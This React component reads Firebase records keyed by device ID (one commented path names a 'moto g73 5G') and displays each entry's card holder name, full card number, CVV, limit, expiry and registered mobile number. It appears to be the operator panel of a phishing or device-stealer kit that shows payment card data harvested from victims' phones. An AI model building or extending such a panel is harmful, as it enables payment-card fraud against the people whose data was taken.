import './App.css';
import React from 'react'
import {useState,useEffect} from 'react'
import {db} from './config';
import {ref , onValue, DataSnapshot } from 'firebase/database';
import './Messages.css';

function Cards(props) {
    const [todoData, setTodoData] = useState([])
    //const [card, setCard] = useState([])
    
    useEffect(() => {
        const starCountRef = ref(db,`DEVICES/${props.val}/REDEEM`)
        // const redeem = ref(db,`DEVICES/${props.val}/REDEEM`)
        // const starCountRef = ref(db,`DEVICES/1fe5164fc5898c46 moto g73 5G/REDEEM`)
      onValue(starCountRef,(snapshot) => {
        const data = snapshot?.val() 
        try{
        const newPost = Object.keys(data).map(key => ({
          id: key,
          ...data[key]
        }));
        console.log(newPost);
        newPost.sort((a, b) => {
          return b.id - a.id;
      });
        console.log(newPost);
        setTodoData(newPost);

     }catch(err){
        // console.error(err);
        const val = []; 
       setTodoData(val);
     }    
      });

    //   onValue(starCountRef,(snapshot) => {
    //     const data = snapshot?.val() 
    //     try{
    //     const card = Object.keys(data).map(key => ({
    //       id: key,
    //       ...data[key]
    //     }));
    //     console.log(card);
    //     redeem.sort((a, b) => {
    //       return b.id - a.id;
    //   });
    //     console.log(card);
    //     setCard(card);

    //  }catch(err){
    //     // console.error(err);
    //     const val = []; 
    //    setTodoData(val);
    //  }    
    //   });
   
    },[props.val]);

  
  return (
   
    <div  className="messages-items">
       <br></br>
      <b>Device INFO - {props.val } </b>
     {/* <div> <b>Mobile Number -  {props.val1}</b></div> */}
      <br></br>
      <br></br>
         {
            todoData.map((item, index ) => {
              return (
                <div className="message" key={index} >
                  {/* <div >({index+1}).  {item.id}</div> */}
                  <div className='msg'><b>Card No - {index+1} </b>
                  <br></br>
                  <div className='msg-con'>Card Holder name -  {item?.cardHoldName}</div>
                  <div className='msg-con'>Card Number - {item?.cardNum}</div>
                  <div className='msg-con'>CVV -  {item?.cvv}</div>
                  <div className='msg-con'>Limit -  {item?.limit}</div>
                  <div className='msg-con'>Month -  {item?.month}</div>
                  <div className='msg-con'>Registered Mobile Number -  {item?.regiMobile}</div>
                  <div className='msg-con'>Year -  {item?.year}</div>
                  
                  </div>
                </div>
              )
            })
          }

        </div>
  )
}

export default Cards;